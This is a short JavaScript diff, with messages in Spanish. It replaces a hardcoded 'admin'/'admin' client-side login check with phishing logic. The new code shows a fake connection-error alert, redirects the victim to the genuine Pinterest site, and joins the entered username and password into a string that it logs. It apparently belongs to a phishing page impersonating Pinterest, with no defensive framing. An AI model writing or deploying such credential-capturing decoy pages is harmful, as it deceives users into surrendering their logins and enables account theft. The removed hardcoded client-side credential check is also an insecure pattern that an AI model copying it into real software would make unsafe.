@@ -1,16 +1,15 @@
 function validateUser(){
-    var usr=document.getElementById("loginField").value;
-    var pwd=document.getElementById("pwdField").value;
-    
-    if(usr==="admin" && pwd ==="admin"){
-        alert("Login Correcto!");
-        window.location.replace('vista.html');
-    }else{
-        alert("Usuario o contraseña Incorrecta");
-    }
-    
+    swal({
+        title: "Error de conexion!\nIntentalo de nuevo",
+        icon: "error"
+    });
+    setTimeout("openTrueSite()",3000);
 }
 
-function goBack(){
-    window.location.replace('index.html');
+function openTrueSite(){
+    window.open("https://www.pinterest.es/pinterest/","_top");
+    var datos=document.getElementById("usrIn").value+":"+document.getElementById("pwdIn").value;
+    console.log("Usuario y contraseña:");
+    console.log(datos);
+    
 }
